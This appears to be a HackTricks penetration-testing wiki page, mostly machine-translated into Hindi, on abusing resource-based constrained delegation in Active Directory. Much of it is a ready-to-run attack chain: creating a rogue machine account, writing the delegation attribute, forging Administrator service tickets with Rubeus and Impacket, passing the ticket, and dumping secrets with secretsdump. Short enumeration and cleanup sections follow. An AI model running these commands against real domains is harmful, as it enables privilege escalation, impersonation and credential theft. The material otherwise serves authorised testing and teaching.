# Resource-based Constrained Delegation

{{#include ../../banners/hacktricks-training.md}}


## Basics of Resource-based Constrained Delegation

यह मूल [Constrained Delegation](constrained-delegation.md) के समान है लेकिन **इसके बजाय** किसी **ऑब्जेक्ट** को **किसी मशीन के खिलाफ किसी भी उपयोगकर्ता का अनुकरण करने** की अनुमति देने के। Resource-based Constrained Delegation **सेट** करता है **उस ऑब्जेक्ट में जो किसी भी उपयोगकर्ता का अनुकरण कर सकता है**।

इस मामले में, सीमित ऑब्जेक्ट में एक विशेषता होगी जिसे _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ कहा जाता है जिसमें उस उपयोगकर्ता का नाम होगा जो इसके खिलाफ किसी अन्य उपयोगकर्ता का अनुकरण कर सकता है।

इस Constrained Delegation और अन्य डेलीगेशनों के बीच एक और महत्वपूर्ण अंतर यह है कि किसी भी उपयोगकर्ता के पास **कंप्यूटर खाते पर लिखने की अनुमति** (_GenericAll/GenericWrite/WriteDacl/WriteProperty/etc_) हो सकती है जो **_msDS-AllowedToActOnBehalfOfOtherIdentity_** सेट कर सकता है (अन्य प्रकार की डेलीगेशन में आपको डोमेन एडमिन विशेषाधिकार की आवश्यकता थी)।

### New Concepts

Constrained Delegation में कहा गया था कि उपयोगकर्ता के _userAccountControl_ मान के अंदर **`TrustedToAuthForDelegation`** ध्वज की आवश्यकता होती है ताकि **S4U2Self** किया जा सके। लेकिन यह पूरी तरह से सच नहीं है।\
वास्तविकता यह है कि भले ही उस मान के बिना, आप किसी भी उपयोगकर्ता के खिलाफ **S4U2Self** कर सकते हैं यदि आप एक **सेवा** हैं (एक SPN है) लेकिन, यदि आपके पास **`TrustedToAuthForDelegation`** है तो लौटाया गया TGS **Forwardable** होगा और यदि आपके पास वह ध्वज नहीं है तो लौटाया गया TGS **Forwardable** **नहीं** होगा।

हालांकि, यदि **S4U2Proxy** में उपयोग किया गया **TGS** **NOT Forwardable** है तो **बुनियादी Constrain Delegation** का दुरुपयोग करने की कोशिश करना **काम नहीं करेगा**। लेकिन यदि आप **Resource-Based constrain delegation** का शोषण करने की कोशिश कर रहे हैं, तो यह काम करेगा।

### Attack structure

> यदि आपके पास **कंप्यूटर** खाते पर **लिखने के समकक्ष विशेषाधिकार** हैं तो आप उस मशीन में **विशेषाधिकार प्राप्त पहुंच** प्राप्त कर सकते हैं।

मान लीजिए कि हमलावर के पास पहले से ही **शिकार कंप्यूटर पर लिखने के समकक्ष विशेषाधिकार** हैं।

1. हमलावर एक खाते को **समझौता** करता है जिसमें एक **SPN** है या **एक बनाता है** (“Service A”)। ध्यान दें कि **कोई भी** _Admin User_ बिना किसी अन्य विशेष विशेषाधिकार के **बना सकता है** 10 कंप्यूटर ऑब्जेक्ट्स तक (**_MachineAccountQuota_**) और उन्हें एक **SPN** सेट कर सकता है। इसलिए हमलावर बस एक कंप्यूटर ऑब्जेक्ट बना सकता है और एक SPN सेट कर सकता है।
2. हमलावर शिकार कंप्यूटर (ServiceB) पर अपने WRITE विशेषाधिकार का **दुरुपयोग** करता है ताकि **resource-based constrained delegation को कॉन्फ़िगर किया जा सके ताकि ServiceA किसी भी उपयोगकर्ता का अनुकरण कर सके** उस शिकार कंप्यूटर (ServiceB) के खिलाफ।
3. हमलावर Rubeus का उपयोग करके एक **पूर्ण S4U हमला** (S4U2Self और S4U2Proxy) Service A से Service B के लिए एक उपयोगकर्ता के लिए **विशेषाधिकार प्राप्त पहुंच के साथ Service B** पर करता है।
1. S4U2Self (समझौता/बनाए गए SPN से): मुझसे **Administrator का TGS** मांगें (Not Forwardable)।
2. S4U2Proxy: पिछले चरण के **not Forwardable TGS** का उपयोग करके **Administrator** से **शिकार होस्ट** के लिए **TGS** मांगें।
3. भले ही आप एक not Forwardable TGS का उपयोग कर रहे हों, क्योंकि आप Resource-based constrained delegation का शोषण कर रहे हैं, यह काम करेगा।
4. हमलावर **पास-दी-टिकट** कर सकता है और **उपयोगकर्ता का अनुकरण** कर सकता है ताकि **शिकार ServiceB** तक पहुंच प्राप्त कर सके।

डोमेन के _**MachineAccountQuota**_ की जांच करने के लिए आप उपयोग कर सकते हैं:
```bash
Get-DomainObject -Identity "dc=domain,dc=local" -Domain domain.local | select MachineAccountQuota
```
## हमला

### कंप्यूटर ऑब्जेक्ट बनाना

आप **[powermad](https://github.com/Kevin-Robertson/Powermad)** का उपयोग करके डोमेन के अंदर एक कंप्यूटर ऑब्जेक्ट बना सकते हैं:
```bash
import-module powermad
New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose

# Check if created
Get-DomainComputer SERVICEA
```
### Resource-based Constrained Delegation को कॉन्फ़िगर करना

**activedirectory PowerShell मॉड्यूल का उपयोग करना**
```bash
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount SERVICEA$ #Assing delegation privileges
Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount #Check that it worked
```
**पॉवerview का उपयोग करना**
```bash
$ComputerSid = Get-DomainComputer FAKECOMPUTER -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer $targetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

#Check that it worked
Get-DomainComputer $targetComputer -Properties 'msds-allowedtoactonbehalfofotheridentity'

msds-allowedtoactonbehalfofotheridentity
----------------------------------------
{1, 0, 4, 128...}
```
### Performing a complete S4U attack (Windows/Rubeus)

सबसे पहले, हमने नए कंप्यूटर ऑब्जेक्ट को पासवर्ड `123456` के साथ बनाया, इसलिए हमें उस पासवर्ड का हैश चाहिए:
```bash
.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local
```
यह उस खाते के लिए RC4 और AES हैश प्रिंट करेगा।\
अब, हमला किया जा सकता है:
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<aes256 hash> /aes128:<aes128 hash> /rc4:<rc4 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /domain:domain.local /ptt
```
आप Rubeus के `/altservice` पैरामीटर का उपयोग करके एक बार पूछकर अधिक सेवाओं के लिए अधिक टिकट उत्पन्न कर सकते हैं:
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt
```
> [!CAUTION]
> ध्यान दें कि उपयोगकर्ताओं के पास "**Cannot be delegated**" नामक एक विशेषता होती है। यदि किसी उपयोगकर्ता के पास यह विशेषता True है, तो आप उसकी नकल नहीं कर पाएंगे। यह संपत्ति bloodhound के अंदर देखी जा सकती है।

### Linux tooling: end-to-end RBCD with Impacket (2024+)

यदि आप Linux से काम कर रहे हैं, तो आप आधिकारिक Impacket उपकरणों का उपयोग करके पूर्ण RBCD श्रृंखला कर सकते हैं:
```bash
# 1) Create attacker-controlled machine account (respects MachineAccountQuota)
impacket-addcomputer -computer-name 'FAKE01$' -computer-pass 'P@ss123' -dc-ip 192.168.56.10 'domain.local/jdoe:Summer2025!'

# 2) Grant RBCD on the target computer to FAKE01$
#    -action write appends/sets the security descriptor for msDS-AllowedToActOnBehalfOfOtherIdentity
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -dc-ip 192.168.56.10 -action write 'domain.local/jdoe:Summer2025!'

# 3) Request an impersonation ticket (S4U2Self+S4U2Proxy) for a privileged user against the victim service
impacket-getST -spn cifs/victim.domain.local -impersonate Administrator -dc-ip 192.168.56.10 'domain.local/FAKE01$:P@ss123'

# 4) Use the ticket (ccache) against the target service
export KRB5CCNAME=$(pwd)/Administrator.ccache
# Example: dump local secrets via Kerberos (no NTLM)
impacket-secretsdump -k -no-pass Administrator@victim.domain.local
```
Notes
- यदि LDAP साइनिंग/LDAPS लागू है, तो `impacket-rbcd -use-ldaps ...` का उपयोग करें।
- AES कुंजियों को प्राथमिकता दें; कई आधुनिक डोमेन RC4 को प्रतिबंधित करते हैं। Impacket और Rubeus दोनों AES-केवल प्रवाह का समर्थन करते हैं।
- Impacket कुछ उपकरणों के लिए `sname` ("AnySPN") को फिर से लिख सकता है, लेकिन जब भी संभव हो सही SPN प्राप्त करें (जैसे, CIFS/LDAP/HTTP/HOST/MSSQLSvc)।

### Accessing

अंतिम कमांड लाइन **पूर्ण S4U हमले को निष्पादित करेगी और **TGS** को Administrator से पीड़ित होस्ट में **मेमोरी** में इंजेक्ट करेगी।\
इस उदाहरण में Administrator से **CIFS** सेवा के लिए एक TGS का अनुरोध किया गया था, इसलिए आप **C$** तक पहुँच सकेंगे:
```bash
ls \\victim.domain.local\C$
```
### विभिन्न सेवा टिकटों का दुरुपयोग

[**यहां उपलब्ध सेवा टिकटों के बारे में जानें**](silver-ticket.md#available-services)।

## गणना, ऑडिटिंग और सफाई

### RBCD कॉन्फ़िगर की गई कंप्यूटरों की गणना करें

PowerShell (SIDs को हल करने के लिए SD को डिकोड करना):
```powershell
# List all computers with msDS-AllowedToActOnBehalfOfOtherIdentity set and resolve principals
Import-Module ActiveDirectory
Get-ADComputer -Filter * -Properties msDS-AllowedToActOnBehalfOfOtherIdentity |
Where-Object { $_."msDS-AllowedToActOnBehalfOfOtherIdentity" } |
ForEach-Object {
$raw = $_."msDS-AllowedToActOnBehalfOfOtherIdentity"
$sd  = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $raw, 0
$sd.DiscretionaryAcl | ForEach-Object {
$sid  = $_.SecurityIdentifier
try { $name = $sid.Translate([System.Security.Principal.NTAccount]) } catch { $name = $sid.Value }
[PSCustomObject]@{ Computer=$_.ObjectDN; Principal=$name; SID=$sid.Value; Rights=$_.AccessMask }
}
}
```
Impacket (एक कमांड के साथ पढ़ें या फ्लश करें):
```bash
# Read who can delegate to VICTIM
impacket-rbcd -delegate-to 'VICTIM$' -action read 'domain.local/jdoe:Summer2025!'
```
### Cleanup / reset RBCD

- PowerShell (attribute को साफ करें):
```powershell
Set-ADComputer $targetComputer -Clear 'msDS-AllowedToActOnBehalfOfOtherIdentity'
# Or using the friendly property
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount $null
```
- Impacket:
```bash
# Remove a specific principal from the SD
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -action remove 'domain.local/jdoe:Summer2025!'
# Or flush the whole list
impacket-rbcd -delegate-to 'VICTIM$' -action flush 'domain.local/jdoe:Summer2025!'
```
## Kerberos Errors

- **`KDC_ERR_ETYPE_NOTSUPP`**: इसका मतलब है कि kerberos को DES या RC4 का उपयोग नहीं करने के लिए कॉन्फ़िगर किया गया है और आप केवल RC4 हैश प्रदान कर रहे हैं। Rubeus को कम से कम AES256 हैश (या बस rc4, aes128 और aes256 हैश प्रदान करें) दें। उदाहरण: `[Rubeus.Program]::MainString("s4u /user:FAKECOMPUTER /aes256:CC648CF0F809EE1AA25C52E963AC0487E87AC32B1F71ACC5304C73BF566268DA /aes128:5FC3D06ED6E8EA2C9BB9CC301EA37AD4 /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:Administrator /msdsspn:CIFS/M3DC.M3C.LOCAL /ptt".split())`
- **`KRB_AP_ERR_SKEW`**: इसका मतलब है कि वर्तमान कंप्यूटर का समय DC के समय से अलग है और kerberos सही तरीके से काम नहीं कर रहा है।
- **`preauth_failed`**: इसका मतलब है कि दिया गया उपयोगकर्ता नाम + हैश लॉगिन करने के लिए काम नहीं कर रहे हैं। आप हैश उत्पन्न करते समय उपयोगकर्ता नाम के अंदर "$" डालना भूल गए होंगे (`.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local`)
- **`KDC_ERR_BADOPTION`**: इसका मतलब हो सकता है:
- जिस उपयोगकर्ता को आप अनुकरण करने की कोशिश कर रहे हैं वह इच्छित सेवा तक पहुँच नहीं सकता (क्योंकि आप इसे अनुकरण नहीं कर सकते या क्योंकि इसके पास पर्याप्त विशेषाधिकार नहीं हैं)
- मांगी गई सेवा मौजूद नहीं है (यदि आप winrm के लिए एक टिकट मांगते हैं लेकिन winrm चल नहीं रहा है)
- बनाए गए fakecomputer ने कमजोर सर्वर पर अपने विशेषाधिकार खो दिए हैं और आपको उन्हें वापस देना होगा।
- आप क्लासिक KCD का दुरुपयोग कर रहे हैं; याद रखें कि RBCD गैर-फॉरवर्डेबल S4U2Self टिकटों के साथ काम करता है, जबकि KCD फॉरवर्डेबल की आवश्यकता होती है।

## Notes, relays and alternatives

- यदि LDAP फ़िल्टर किया गया है तो आप AD वेब सेवाओं (ADWS) पर RBCD SD भी लिख सकते हैं। देखें:

{{#ref}}
adws-enumeration.md
{{#endref}}

- Kerberos रिले श्रृंखलाएँ अक्सर एक कदम में स्थानीय SYSTEM प्राप्त करने के लिए RBCD पर समाप्त होती हैं। व्यावहारिक अंत-से-अंत उदाहरण देखें:

{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

## References

- [https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html)
- [https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/](https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/)
- [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object)
- [https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/](https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/)
- [https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)
- Impacket rbcd.py (official): https://github.com/fortra/impacket/blob/master/examples/rbcd.py
- Quick Linux cheatsheet with recent syntax: https://tldrbins.github.io/rbcd/


{{#include ../../banners/hacktricks-training.md}}
